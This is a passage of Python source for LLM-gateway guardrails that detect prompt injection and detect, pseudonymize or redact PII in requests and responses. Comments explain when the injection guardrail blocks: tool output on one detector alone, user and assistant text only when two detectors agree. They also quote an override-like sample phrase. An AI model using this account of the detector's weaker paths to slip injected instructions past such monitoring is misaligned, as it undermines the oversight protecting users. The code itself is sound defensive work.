        grounded = self.resolve_grounded(data, user_api_key_dict)

        if call_type not in _CHAT_CALL_TYPES:
            return data

        if self._exempt(data):
            return data

        if not self._control.enabled:
            return data

        messages = data.get("messages")
        if messages is not None and (
            not isinstance(messages, list)
            or any(not isinstance(message, dict) for message in messages)
        ):
            # `extract_spans` assumes a list of dict messages and is off
            # limits to modify here; a malformed shape would otherwise raise
            # AttributeError deep inside it — an exception type nothing in
            # this hook expects. Treated the same as a scanner outage: we
            # cannot certify a request we cannot even parse, so the same
            # enforced/fail-open-by-mode branching applies.
            return self._on_outage(
                data, user_api_key_dict, TypeError("'messages' is not a list of dicts")
            )

        spans = extract_spans(messages)
        if not spans:
            return data

        started = time.perf_counter()
        try:
            findings = await self._scan_all(spans)
        except Exception as exc:
            # Caught broadly, not just `ScannerUnavailable`: a scanner that
            # raises a type this hook does not recognise must still respect
            # logging_only's never-break-traffic guarantee (and enforcing's
            # fail-closed guarantee) rather than escape as an exception type
            # nothing here expects. `Scanner.scan` is documented to raise
            # only `ScannerUnavailable`, but a hook that trusts that
            # contract absolutely is one bug away from either breaking
            # shadow-mode traffic or bypassing enforcement, depending on
            # where a future scanner implementation's bug happens to sit.
            return self._on_outage(data, user_api_key_dict, exc)
        finally:
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )

        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

        transforms = audit.canonical_transforms(
            [canonicalize(span.text) for span in spans]
        )
        decision = decide(self._control, findings, grounded)
        if decision.action is Action.ALLOW:
            return data

        # Detection and enforcement are separate questions. `_enforcing()` says
        # the control is switched on; `enforceable()` says this particular
        # verdict came from a source the control may act on, with whatever
        # corroboration that source requires. G1 detects on every span; it
        # blocks on `untrusted` (a tool or function result, or an unrecognised
        # role) from either detector alone, and on `user` or `assistant` only
        # when BOTH detectors crossed their thresholds -- because the
        # classifier scores "Ignore the previous draft and start over"
        # identically to a real injection, and scores the model's own safety
        # refusal 1.0000 as well. As sentences they ARE the same sentence. What
        # separates them is whose text it is, and whether a second, independent
        # detector agrees.
        #
        # A verdict that fails either test still goes through _emit with
        # enforced=false, so it is counted and auditable; it just does not stop
        # the request.
        enforced = self._enforcing() and self._control.enforceable(decision.findings)
        event = self._emit(data, decision, transforms, user_api_key_dict, enforced)
        if not enforced:
            return data

        raise GuardrailBlocked(
            code="LLM01_INJECTION",
            event_id=event["event_id"],
            detail=_block_detail("LLM01_INJECTION", event["event_id"]),
            status_code=400,
        )

    def _on_outage(
        self, data: dict[str, Any], key: Any, exc: Exception
    ) -> dict[str, Any]:
        """Record the outage, then act on it.

        An outage that blocks a request is a blocking path, and a blocking
        path with no audit event is invisible: `GUARDRAIL_DECISIONS` stays
        flat, so an operator watching it cannot distinguish "G1 is
        fail-closing on every request because the scanner is down" from
        "nothing was blocked at all" — and an `event_id` handed to the
        client that was never recorded anywhere cannot be looked up
        afterwards. This was the brief's own reference `_on_outage`
        (`raise GuardrailBlocked(..., event_id=audit.new_event_id(), ...)`
        with no `_emit` call at all) — the same blind spot this whole
        project exists to remove, reproduced inside the control whose job
        is to make control state visible. Fixed by building a synthetic
        `Decision` and routing it through the same `_emit` path as any
        other verdict, in BOTH enforcing and shadow mode, so
        `GUARDRAIL_DEGRADED` (the infra-level "something is down" signal)
        and the audit trail (the per-request "here is what happened"
        signal) are both populated regardless of whether the request was
        actually enforced against.

        `decision.action` is always `Action.BLOCK`: an outage always means
        "we could not certify this request", independent of whether this
        control's `fail` setting or `mode` goes on to act on that. Whether
        it is actually enacted is carried entirely by `enforced` — `fail:
        open` and `logging_only` both produce `enforced=False` (a visible
        "would have blocked" event, never a broken request), `fail: closed`
        plus an enforcing mode produces `enforced=True` and the raise below.

        `decision.reason` never includes `str(exc)`: with `findings=()`,
        `audit._safe_reason` returns `decision.reason` UNCHANGED (there are
        no findings to rebuild it from), so this is the one place in this
        module where nothing downstream sanitises what lands in the
        server-side audit trail. `type(exc).__name__` is always a fixed,
        safe Python identifier; the exception's own message — which could
        echo request-shaped text from a future scanner or decoder bug — is
        confined to the client-facing `GuardrailBlocked.detail` below and
        the operator-only warning log, never the persisted event.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not certify request (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)

        # `self.outage_can_enforce` gates this alongside `fails_closed` and
        # `_enforcing()` — not because G1 needs it today (it is declared
        # `True` above precisely because this class DOES raise
        # `GuardrailBlocked` below), but because leaving it out of the
        # formula would make the class attribute purely decorative for the
        # one control that actually has a mechanism to enforce: if a future
        # edit ever removed the `outage_can_enforce = True` override from
        # this class, `self._control.fails_closed and self._enforcing()`
        # alone would still raise on a fails-closed outage, silently
        # disagreeing with what the class now claims about itself.
        enforced = self.outage_can_enforce and self._control.fails_closed and self._enforcing()
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        event = self._emit(data, decision, (), key, enforced)
        if enforced:
            raise GuardrailBlocked(
                code="GUARDRAIL_UNAVAILABLE",
                event_id=event["event_id"],
                detail=_block_detail("GUARDRAIL_UNAVAILABLE", event["event_id"]),
                status_code=503,
            )
        return data


PRESIDIO_API_BASE = os.environ.get(
    "PRESIDIO_ANALYZER_API_BASE", "http://presidio-analyzer:3000"
)
PRESIDIO_TIMEOUT_S = float(os.environ.get("PRESIDIO_TIMEOUT_S", "5.0"))
# Fallback only. The real list is `options.entities` in policy.yaml, because
# which entity types count as "sensitive disclosure" is a policy question, not
# a code question -- and this list living in code was a straight violation of
# this project's own rule that policy belongs in policy.yaml.
#
# LOCATION is deliberately ABSENT. Presidio's entity recognizers fall into two
# groups with very different precision, measured against realistic benign text
# on 2026-07-29:
#
#   deterministic (EMAIL_ADDRESS, CREDIT_CARD, PHONE_NUMBER, US_SSN,
#   IBAN_CODE, IP_ADDRESS) -- score 1.00, and every hit was correct.
#
#   NER (PERSON, LOCATION) -- score a FLAT 0.85 whether right or wrong, so no
#   threshold can separate a true hit from a false one.
#
# LOCATION produced 4 hits across 8 benign texts and ALL FOUR were wrong:
# "Vietnam", "Hanoi", "Southeast Asia" -- and "Q3", which is not a place at
# all. A city named in an answer is not sensitive information disclosure, and
# the recognizer is not reliable enough to be worth the noise.
#
# PERSON is omitted too, and this was measured rather than assumed. Across 8
# benign technical sentences and 3 containing real PII:
#
#   with PERSON        3/8 false positives, 3/3 real PII caught
#   structured only    0/8 false positives, 3/3 real PII caught
#
# So it costs nothing here and flags "Docker Compose", "Prometheus", "Nginx"
# and "React Query" as people. G2b REDACTS, so each of those puts [PERSON] in a
# user's answer. Structured identifiers are also the only ones Presidio scores
# with real confidence (1.00 vs a flat 0.85), which is why this is the default
# in production LLM gateways generally, not a local shortcut.
#
# The honest gap: a response containing ONLY a bare name and no structured
# identifier is not caught. A deployment handling support transcripts or
# customer records should add PERSON back in policy.yaml and accept the
# false-positive rate -- that is a deployment decision, and it is now one line.
_DEFAULT_PII_ENTITIES = (
    "EMAIL_ADDRESS",
    "PHONE_NUMBER",
    "CREDIT_CARD",
    "US_SSN",
    "IBAN_CODE",
    "IP_ADDRESS",
)


def _pii_entities(control: ControlConfig) -> list[str]:
    """Entity types this control asks Presidio for.

    Presidio treats the list as a FILTER: an entity absent from it is never
    returned, at any score. So this is the real control over what G2a/G2b can
    see -- more so than the thresholds, which cannot separate a true NER hit
    from a false one when both score 0.85.
    """
    configured = control.options.get("entities")
    if configured is None:
        return list(_DEFAULT_PII_ENTITIES)
    if not isinstance(configured, list) or not configured:
        raise ValueError(
            f"{control.id}: options.entities must be a non-empty list of "
            f"Presidio entity types, got {configured!r}"
        )
    return [str(entity) for entity in configured]


def _default_pii_scanner(control: ControlConfig) -> PiiScanner:
    return PiiScanner(
        base_url=PRESIDIO_API_BASE,
        timeout_s=PRESIDIO_TIMEOUT_S,
        entities=_pii_entities(control),
        language=os.environ.get("PRESIDIO_LANGUAGE", "en"),
    )


# Fallback only, exactly like `_DEFAULT_PII_ENTITIES` above: the real list is
# `options.nufi_entities` in policy.yaml, because which Korean identifiers a
# deployment redacts is a policy question. Both lists live in the same control
# block there, which is where the two engines' coverage should be compared.
#
# The three below are the ones measured to earn their place. Presidio returns
# NOTHING actionable on any of them (KR_RRN and KR_PHONE: no result at all;
# KR_BRN: PHONE_NUMBER at 0.40, under G2b's 0.50 threshold), so this is
# coverage the gateway did not have, not a second opinion on coverage it did.
#
# What is NOT here matters more, and each exclusion is a measured number rather
# than a preference -- see policy.yaml, where the numbers are recorded next to
# the list an operator would edit.
_DEFAULT_NUFI_PII_ENTITIES = (
    "KR_RRN",
    "KR_FOREIGNER_REG",
    "KR_PHONE",
)

# Optional override for the vendored rules file. Unset by default: the rules
# ship at `litellm/guardrails/nufi_patterns.yaml` and the scanner resolves that
# to an absolute path off its own location. See `nufi_pii.VENDORED_PATTERNS_PATH`
# for why the library's own discovery is never used.
NUFI_PII_PATTERNS_PATH = os.environ.get("NUFI_PII_PATTERNS_PATH") or None


def _nufi_pii_entities(control: ControlConfig) -> list[str]:
    """Entity types this control asks the Korean PII engine for.

    Same shape and same reasoning as `_pii_entities`, and a separate key
    because the two engines have different vocabularies: `EMAIL_ADDRESS` is
    Presidio's name and `EMAIL` is theirs, and pretending one list could serve
    both would mean silently dropping whichever names the other engine does not
    know. A name this engine cannot produce is refused at construction rather
    than filtered to nothing -- see `NufiPiiScanner.__init__`.
    """
    configured = control.options.get("nufi_entities")
    if configured is None:
        return list(_DEFAULT_NUFI_PII_ENTITIES)
    if not isinstance(configured, list) or not configured:
        raise ValueError(
            f"{control.id}: options.nufi_entities must be a non-empty list of "
            f"nufi-security rule names, got {configured!r}"
        )
    return [str(entity) for entity in configured]


def _default_nufi_pii_scanner(control: ControlConfig) -> NufiPiiScanner:
    return NufiPiiScanner(
        entities=_nufi_pii_entities(control),
        patterns_path=NUFI_PII_PATTERNS_PATH,
    )


class G2aPiiInput(BaseNufiGuardrail):
    """Detects PII in the prompt. Logs only — the prompt is never rewritten.

    Not an oversight to be "improved" later: the previous system masked PII
    on input and the model began answering the placeholder instead of the
    question — a user asking about `sun@dudaji.com` got a reply about
    `<PERSON>`. `data` is never touched by this control, in any mode, on
    any finding. See policy.yaml's G2a for the recorded rationale.
    """

    control_id = "G2a"
    # This control has no mechanism to withhold or alter a request: every
    # path through `async_pre_call_hook` and `_on_outage` ends in
    # `return data`, in every mode, regardless of `fail`. See
    # `BaseNufiGuardrail.outage_can_enforce` for why this must be declared
    # explicitly rather than left to the (enforcement-capable) default.
    outage_can_enforce = False

    def __init__(
        self,
        policy: Policy | None = None,
        scanner: Any | None = None,
        nufi_scanner: Any | None = None,
        **kwargs: Any,
    ) -> None:
        super().__init__(policy=policy, **kwargs)
        # Two PII detectors, both run on every request, both reported --
        # alongside each other, not one replacing the other. Presidio is
        # English-centric and cannot see a Korean resident-registration number
        # at all; the local engine cannot see an IBAN or a US SSN. Neither is a
        # superset, so both run and `policy.decide` prices the pooled findings.
        self._scanners = [
            scanner or _default_pii_scanner(self._control),
            nufi_scanner or _default_nufi_pii_scanner(self._control),
        ]

    async def async_pre_call_hook(
        self, user_api_key_dict: Any, cache: Any, data: dict[str, Any], call_type: str
    ) -> dict[str, Any]:
        log_masking.install(data)

        if call_type not in _CHAT_CALL_TYPES or not self._control.enabled:
            return data

        if self._exempt(data):
            return data

        messages = data.get("messages")
        if messages is not None and (
            not isinstance(messages, list)
            or any(not isinstance(message, dict) for message in messages)
        ):
            # Same malformed-shape risk `G1Injection` guards against, and for
            # the same reason: `extract_spans` assumes a list of dict messages
            # and is off limits to modify here. Left unguarded, a
            # non-conforming `messages` shape would raise AttributeError deep
            # inside it — an exception type this "detect and log only, never
            # break traffic" control does not expect, and uncaught, WOULD
            # break traffic: the exact contract this control exists to
            # uphold. Routed through the same outage path as a scanner
            # failure rather than reimplemented here.
            return self._on_outage(
                data, user_api_key_dict, TypeError("'messages' is not a list of dicts")
            )

        spans = extract_spans(messages)
        if not spans:
            return data

        # Whether this request will be rewritten is known BEFORE scanning, from
        # the control's configured action and the key's opt-in -- `decide` only
        # chooses between that action and ALLOW. It has to be known first,
        # because it changes how the scan is performed.
        rewriting = self._control.action is Action.PSEUDONYMIZE and self._opted_in(
            user_api_key_dict
        )

        started = time.perf_counter()
        try:
            if rewriting:
                # Scanned span by span, so each finding stays attached to the
                # text its offsets index into. `Finding` records `start`/`end`
                # and NOT which text they belong to, and the pooled scan below
                # throws that away -- an offset with no referent cannot be used
                # to rewrite anything. A first draft of this filtered the pooled
                # findings on a `message_index` attribute `Finding` does not
                # have, so every filter returned empty and the control rewrote
                # nothing while the audit trail recorded `pseudonymize`.
                #
                # The same findings then drive both the decision and the
                # rewrite. Re-scanning later for the rewrite alone would be a
                # second, unaudited detection that could disagree with the one
                # `_emit` recorded. The extra scanner calls are paid only by a
                # workload that opted in.
                per_span = [(span, await self._scan_all([span]) + scan_secrets([span]))
                            for span in spans]
                findings = [finding for _, found in per_span for finding in found]
            else:
                per_span = []
                findings = await self._scan_all(spans) + scan_secrets(spans)
        except Exception as exc:
            # Caught broadly, not just `ScannerUnavailable`, matching
            # `G1Injection`: `PiiScanner.scan` is documented to raise only
            # `ScannerUnavailable`, and `scan_secrets` is documented to never
            # raise at all (it is pure) — but trusting either contract
            # absolutely is one bug away from turning a shadow-mode
            # measurement, or this control's own fail-open guarantee, into a
            # broken live request.
            return self._on_outage(data, user_api_key_dict, exc)
        finally:
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )

        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

        # `grounded` never affects this control's own decision: G2a has no
        # `respect_grounded_hint` option in policy.yaml (only G2b does), so
        # `policy.decide`'s `grounded and control.options.get(...)` branch
        # can never fire here regardless of the value passed. Hardcoded
        # rather than resolved from the request: G1 is the sole, mandatory
        # pre_call control responsible for recording the verified verdict
        # (`resolve_grounded`) for every *other* control to read; G2a does
        # not need it for itself and must not re-derive it from the raw,
        # attacker-controllable client hint.
        decision = decide(self._control, findings, grounded=False)
        if decision.action is not Action.ALLOW:
            self._emit(data, decision, (), user_api_key_dict, self._enforcing())
        if rewriting and decision.action is Action.PSEUDONYMIZE:
            self._pseudonymize(data, per_span, messages)
        return data

    def _opted_in(self, key: Any) -> bool:
        """Has this workload asked for pseudonymization?

        Two gates, and both are needed. `action: pseudonymize` in policy.yaml
        says the deployment permits it at all; the key's own metadata says this
        workload wants it. Measured: pseudonymization serves a request that
        CARRIES a value and cannot serve one that asks ABOUT it -- `is this a
        valid email address` answered `No.` where the unpseudonymized request
        answered `Yes` (§7.3a). The gateway cannot tell the two apart from the
        request, so the deployment declares which of its workloads are which.

        `require_opt_in: false` in the control's options is for a deployment
        whose traffic is entirely payload-shaped. It is an explicit statement,
        not a default, for the same reason.
        """
        if not self._control.options.get("require_opt_in", True):
            return True
        metadata = getattr(key, "metadata", None)
        return isinstance(metadata, dict) and metadata.get(pseudonymize.OPT_IN_KEY) is True

    def _pseudonymize(
        self,
        data: dict[str, Any],
        per_span: list[tuple[Span, list[Finding]]],
        messages: list[Any],
    ) -> None:
        """Replace reversible values with surrogates, writing back onto `data`.

        The ONE path in this control that writes to `data`. The class docstring's
        "never rewrites, in any mode, on any finding" is now "never rewrites
        unless a workload opted into this action", and the recorded rationale
        behind the original rule is intact -- it is exactly why the opt-in
        exists. Measured with a surrogate rather than `<PERSON>`: without the
        injected instruction the model answers the placeholder instead of the
        question, the same failure, so the instruction goes on every rewritten
        request and the action is not a default.

        ONE vault session for the whole request, not one per message: the
        response leg gets one place to look and one thing to wipe, and the same
        address appearing twice mints one surrogate rather than two.

        All or nothing. Any exception wipes the session and leaves `data`
        untouched. A partial rewrite -- some values replaced, no session id
        stored -- would send the provider tokens the response leg cannot resolve,
        so the user would receive `[EMAIL_ADDRESS]` for a value that never needed
        redacting while the audit trail said `pseudonymize`.
        """
        engine = pseudonymize.shared()
        ref = f"grd-pseudo-{uuid.uuid4().hex}"
        by_index = {span.message_index: found for span, found in per_span if found}
        rewritten: list[Any] = []
        minted: list[str] = []
        replaced = 0

        try:
            for index, message in enumerate(messages):
                found = by_index.get(index)
                content = message.get("content") if isinstance(message, dict) else None
                if not found or not isinstance(content, str) or not content:
                    rewritten.append(message)
                    continue
                result = engine.pseudonymize(content, found, ref=ref)
                if result.count:
                    replaced += result.count
                    minted.extend(result.entities)
                    rewritten.append({**message, "content": result.text})
                else:
                    rewritten.append(message)

            if not replaced:
                engine.end_session(ref)
                return

            metadata = data.get("metadata")
            if metadata is None:
                metadata = {}
                data["metadata"] = metadata
            if not isinstance(metadata, dict):
                # Nowhere to tell the response leg where the mapping is, so the
                # rewrite must not happen at all. Tokens the other leg cannot
                # resolve are strictly worse than the values it would have
                # redacted.
                raise TypeError("'metadata' is not a dict")

            metadata[pseudonymize.SESSION_KEY] = ref
            data["messages"] = pseudonymize.instructed(rewritten)
        except Exception as exc:  # noqa: BLE001 - see the docstring
            engine.end_session(ref)
            verbose_proxy_logger.warning(
                "guardrail %s could not pseudonymize, request left unchanged (%s): %s",
                self.control_id,
                type(exc).__name__,
                exc,
            )
            return

        for entity in minted:
            audit.GUARDRAIL_PSEUDONYM_MINTED.labels(control=self.control_id, entity=entity).inc()
        audit.GUARDRAIL_PSEUDONYM_SESSIONS.set(engine.active_count())

    def _on_outage(self, data: dict[str, Any], key: Any, exc: Exception) -> dict[str, Any]:
        """Record the outage so it is visible, then let the request continue.

        A `GUARDRAIL_DEGRADED` gauge flip alone is a fleet-wide signal, not a
        per-request one: an operator investigating one specific "PII went
        through unnoticed" report needs an `event_id` in the audit trail to
        confirm "G2a could not see this particular request", not just "the
        gauge was elevated at some point". This is the same blind spot Task
        10 found and fixed in `G1Injection._on_outage` — reproduced here
        because a control that only sets a gauge on outage leaves
        `GUARDRAIL_DECISIONS` unable to distinguish "no PII in traffic" from
        "PII detection was blind for this request".

        `enforced` is gated by `self.outage_can_enforce` (declared `False`
        above), not just this control's own `_enforcing()` — an earlier
        draft passed `self._enforcing()` alone, the same value the
        non-outage path below passes to `_emit`, and NOT
        `fails_closed and _enforcing()` as `G1Injection._on_outage` computes
        it either. Both of those still let `enforced` come back `True`
        whenever this control is out of shadow mode, even though G2a always
        returns `data` unchanged, in every mode, regardless of `fail` — a
        phantom "enforced" block recorded for a control that structurally
        cannot block anything. `outage_can_enforce` collapses `enforced` to
        `False` unconditionally, matching what this control can actually do
        rather than what mode it happens to be in.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not scan request (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        enforced = self.outage_can_enforce and self._enforcing()
        self._emit(data, decision, (), key, enforced)
        return data


class G2bPiiOutput(BaseNufiGuardrail):
    """Redacts PII and secrets in the model's response.

    Honours the grounded hint, but only the *verified* verdict `G1Injection`
    recorded during `pre_call` — read via `verified_grounded`, never the raw
    client claim `data["metadata"]["nufi_grounded"]`, which is
    attacker-controllable. A user asking about an email address inside their
    own (grounded) document gets the real address back.
    """

    control_id = "G2b"
    # This control has no mechanism to withhold or alter a response it cannot
    # rewrite: `_on_outage` returns the text untouched on every path, in every
    # mode, regardless of `fail`. Declared explicitly (matching `G2aPiiInput`
    # and `G4OutputHandling`) rather than left to the inherited default, so
    # `_on_outage` has a stated attribute to read instead of a hardcoded
    # `False` that agrees with it only by coincidence.
    outage_can_enforce = False

    def __init__(
        self,
        policy: Policy | None = None,
        scanner: Any | None = None,
        nufi_scanner: Any | None = None,
        **kwargs: Any,
    ) -> None:
        super().__init__(policy=policy, **kwargs)
        # Both engines, for the reason `G2aPiiInput.__init__` gives. This is
        # the control where it shows: G2b REDACTS, so a Korean identifier
        # Presidio cannot see is one that reaches the user's screen.
        self._scanners = [
            scanner or _default_pii_scanner(self._control),
            nufi_scanner or _default_nufi_pii_scanner(self._control),
        ]

    @staticmethod
    def redact(text: str, findings: list[Any]) -> str:
        """Replace each finding's span with `[ENTITY]`, back to front.

        Findings are processed in DESCENDING `start` order so every
        earlier (lower-start) replacement slices into a suffix of `text`
        that has not been touched yet — its own `start`/`end` stay valid
        character offsets even as the string shortens from replacements
        already made further to the right. `PiiScanner` confirms Presidio's
        offsets are character offsets matching Python `str` indexing
        (verified against Vietnamese in NFC and NFD, and an astral-plane
        emoji), which is what makes this front-to-back invariant hold at
        all.

        Each finding's offsets are additionally clamped to `[0, len(text)]`
        and to the region not yet consumed by a previously-processed
        (higher-start) finding. Two independent detectors — Presidio and
        the secrets regex list — scan the same text and can report
        overlapping spans; re-slicing an overlapping finding with its
        ORIGINAL offsets against the ALREADY-SHORTENED string would index
        into the wrong characters, either corrupting adjacent text or
        leaving a fragment of the original PII exposed — and neither
        failure raises, so it would look exactly like a clean redaction.
        Clamping to the not-yet-redacted region is what keeps this correct
        when findings overlap, instead of trusting each finding's offsets
        in isolation.
        """
        if not findings:
            return text
        length = len(text)
        out = text
        redacted_from = length
        for finding in sorted(findings, key=lambda f: f.start, reverse=True):
            start = max(0, min(finding.start, length))
            end = max(start, min(finding.end, length))
            end = min(end, redacted_from)
            if start >= end:
                # Fully inside a region a higher-start finding already
                # redacted (or an offset that does not fit `text` at all) —
                # nothing left here to act on.
                continue
            label = finding.entity or "REDACTED"
            out = out[:start] + f"[{label}]" + out[end:]
            redacted_from = start
        return out

    async def apply_guardrail(
        self,
        inputs: dict[str, Any],
        request_data: dict[str, Any] | None,
        input_type: str,
        logging_obj: Any = None,
    ) -> dict[str, Any]:
        if self._exempt(request_data):
            return inputs

        """Redact PII in the model's response.

        This is LiteLLM's real base-class hook (`CustomGuardrail.apply_guardrail`,
        verified against the installed litellm==1.83.10, not the docs page —
        an earlier draft of this method used a `(text, ..., request_data) ->
        str` signature taken from the docs page instead). The method NAME is
        load-bearing: `litellm/proxy/common_request_processing.py` checks
        `if "apply_guardrail" in type(cb).__dict__` and reroutes dispatch
        through `unified_guardrail`'s translation layer whenever it is
        present, for BOTH the non-streaming (`process_output_response`) and
        end-of-stream streaming (`process_output_streaming_response`) paths —
        the "used by both hooks" character `redact` is built around.
        Defining this method with any other signature does not fall back to
        a different hook; every per-provider handler (e.g.
        `litellm/llms/openai/chat/guardrail_translation/handler.py`) calls
        `guardrail_to_apply.apply_guardrail(inputs=..., request_data=...,
        input_type=..., logging_obj=...)` positionally-compatible with
        keywords, so a mismatched signature raises `TypeError` on every
        request through the proxy — an outage caused by the guardrail
        itself.

        `inputs["texts"]` is a list of strings (`GenericGuardrailAPIInputs`);
        the return value replaces them. `input_type` distinguishes the
        request leg from the response leg — G2b only acts on `"response"`,
        since this control exists to redact what the model said, not what
        the user asked (that is G2a's job, and G2a never rewrites anything).

        Each text is scanned and decided on independently: nothing on
        `Finding` identifies which text produced it, so a finding's offsets
        are only safe to slice against the text that produced it, and one
        text's verdict must never redact another's. A scanner failure on
        ONE text degrades to "leave THIS text unredacted, record the outage"
        via `_on_outage` and continues with the rest of the batch — it does
        NOT abort the whole response and discard every other text's
        already-computed, already-audited redaction. An earlier draft of
        this method wrapped the entire loop in one try/except and returned
        the wholly-untouched `inputs` on any single text's failure: if text
        #1 had already been redacted and its REDACT decision already
        `_emit`-ted (audit trail says "redacted, enforced"), and text #3
        then failed, that draft discarded text #1's redaction too — MORE PII
        reached the client than a per-text failure alone would ever leak,
        while the audit trail kept claiming text #1 was redacted. Verified
        by execution (see the task report) rather than assumed correct.
        """
        if input_type != "response" or not self._control.enabled:
            return inputs

        texts = inputs.get("texts") or []
        if not texts:
            return inputs

        data = request_data if isinstance(request_data, dict) else {}
        grounded = self.verified_grounded(data)
        # `and not _stream_dispatch_anomaly`: reaching THIS method for a
        # streamed response means litellm did not route the request through
        # `async_post_call_streaming_iterator_hook` below, so the rewrite
        # computed here is discarded before the client sees it and
        # `enforced=True` would record an effect that did not happen. It is no
        # longer the normal streaming path — it is a dispatch failure, and
        # `_stream_dispatch_anomaly` logs it as one. See
        # `BaseNufiGuardrail.streamed`.
        enforced = self._enforcing() and not self._stream_dispatch_anomaly(data)
        rewritten: list[str] = []

        for item in texts:
            if not item:
                rewritten.append(item)
                continue

            # `UNTRUSTED` and not `ASSISTANT`, even though this text IS the
            # model's output. `SpanSource.ASSISTANT` (2026-07-30) exists to give
            # a PRIOR assistant turn a different ENFORCEMENT rule in G1 --
            # corroboration -- and G2b has no `enforce_sources` or
            # `require_corroboration` at all, so the label here only selects a
            # threshold. policy.yaml sets G2b's `assistant` and `untrusted` to
            # the same value precisely so this choice cannot change what G2b
            # redacts either way; left as `UNTRUSTED` so the split touched one
            # control's behaviour and not four.
            spans = [Span(text=item, source=SpanSource.UNTRUSTED, message_index=0)]
            started = time.perf_counter()
            try:
                findings = await self._scan_all(spans) + scan_secrets(spans)
            except Exception as exc:
                # Caught broadly for the same reason as `G2aPiiInput`: neither
                # `PiiScanner.scan` nor `scan_secrets`'s documented contract
                # should be trusted absolutely by the one control whose
                # entire job is not letting PII pass unredacted. Scoped to
                # THIS item only — the rest of the batch still gets a real
                # decision.
                rewritten.append(self._on_outage(item, data, exc))
                continue
            finally:
                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                    time.perf_counter() - started
                )

            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

            decision = decide(self._control, findings, grounded)
            if decision.action is not Action.REDACT:
                rewritten.append(item)
                continue

            self._emit(data, decision, (), None, enforced)
            rewritten.append(self.redact(item, list(decision.findings)) if enforced else item)

        if enforced:
            inputs["texts"] = rewritten

        # Restoration runs AFTER redaction, and the order is load-bearing. A
        # surrogate carries no PII, so redaction finds nothing in it; restoring
        # first would put the original address back into the text and G2b would
        # then immediately redact the value it had just recovered. Run this way,
        # the two do different jobs on disjoint content: redaction removes PII
        # the MODEL introduced, restoration returns values the USER already had.
        #
        # Applied to `inputs["texts"]` rather than `rewritten` because the
        # redaction above is conditional on `enforced` while restoration is not:
        # a shadow-mode G2b must still restore, or a workload that opted into
        # pseudonymization would receive raw surrogates whenever the control was
        # not enforcing.
        inputs["texts"] = self._restore_all(inputs.get("texts") or texts, data)
        return inputs

    def _restore_all(self, texts: list[str], request_data: dict[str, Any]) -> list[str]:
        """Put the user's own values back into every text, and count the failures.

        Never raises. A restoration that fails must leave the text as it is: the
        surrogate carries no PII, so the worst case is a user seeing a token
        rather than their address, and that is strictly better than turning a
        successful response into an error.
        """
        ref = self.pseudonym_ref(request_data)
        if not ref or self.streamed(request_data):
            # On a streamed request this method still runs (litellm routes the
            # end-of-stream leg through `apply_guardrail` too) but `_PiiStream`
            # already restored every chunk on the wire. Restoring again here
            # would double-count `restored_total` against a rewrite litellm
            # discards, and wiping the session would destroy the mapping the
            # chunks are still using.
            return list(texts)

        engine = pseudonymize.shared()
        out: list[str] = []
        try:
            for text in texts:
                result = engine.restore(text, ref) if isinstance(text, str) else None
                if result is None:
                    out.append(text)
                    continue
                out.append(result.text)
                for outcome, count in (
                    ("restored", result.restored),
                    ("fallback", result.fallback),
                    ("mangled", result.mangled),
                ):
                    if count:
                        audit.GUARDRAIL_PSEUDONYM_RESTORED.labels(
                            control=self.control_id, outcome=outcome
                        ).inc(count)
        except Exception as exc:  # noqa: BLE001 - see the docstring
            verbose_proxy_logger.warning(
                "guardrail %s could not restore pseudonyms (%s): %s",
                self.control_id,
                type(exc).__name__,
                exc,
            )
            return list(texts)
        finally:
            # Wiped here, on the non-streaming path, because this is where the
            # round trip ends. The streaming path wipes in `_PiiStream.finish`,
            # after the last chunk -- doing it here would destroy the mapping
            # before the stream had used it. Either way the TTL is the backstop
            # for a request that died in between.
            if not self.streamed(request_data):
                engine.end_session(ref)
                audit.GUARDRAIL_PSEUDONYM_SESSIONS.set(engine.active_count())
        return out

    @staticmethod
    def pseudonym_ref(request_data: dict[str, Any] | None) -> str | None:
        """The vault session G2a left for this request, if any."""
        metadata = (request_data or {}).get("metadata") or {}
        if not isinstance(metadata, dict):
            return None
        ref = metadata.get(pseudonymize.SESSION_KEY)
        return ref if isinstance(ref, str) and ref else None

    def _on_outage(self, text: str, request_data: Any, exc: Exception) -> str:
        """Record the outage, then fail open: return `text` unredacted.

        G2b's policy is `fail: open` (policy.yaml), matching G2a's own
        rationale: an outage must not withhold or corrupt a response the
        model already produced. But an outage that silently returns
        unredacted PII is the highest-stakes version of the Task 10 blind
        spot this project keeps closing — with no signal beyond the
        fleet-wide `GUARDRAIL_DEGRADED` gauge, an operator investigating one
        specific PII-leak report has no per-request `event_id` to confirm
        "G2b could not redact this one" versus "there was nothing to
        redact". `enforced` comes out `False`: this control has no mechanism
        to withhold a response at all (unlike `G1Injection`, it never raises
        `GuardrailBlocked`), so recording anything else would claim an
        effect that never happened. If a future policy ever sets G2b's
        `fail: closed`, this method still fails open — there is no
        response-blocking mechanism for this control to invoke, and adding
        one is a larger design decision this task does not make silently.

        That `False` is READ from `self.outage_can_enforce`, not written as
        a literal. It was a literal until the final review: the class
        attribute that every other control's `_on_outage` consults was, on
        this one and on `G4OutputHandling`, purely decorative — setting
        `G2b.outage_can_enforce = True` changed nothing, so the attribute
        that documents "can this control's outage path enforce?" and the
        code that decides it could disagree without a single test noticing.
        `self._enforcing()` is kept in the conjunction (and is what makes
        the attribute observable at all) so that a control which later gains
        a real withholding mechanism gets the same
        `outage_can_enforce and _enforcing()` formula `G2aPiiInput` uses,
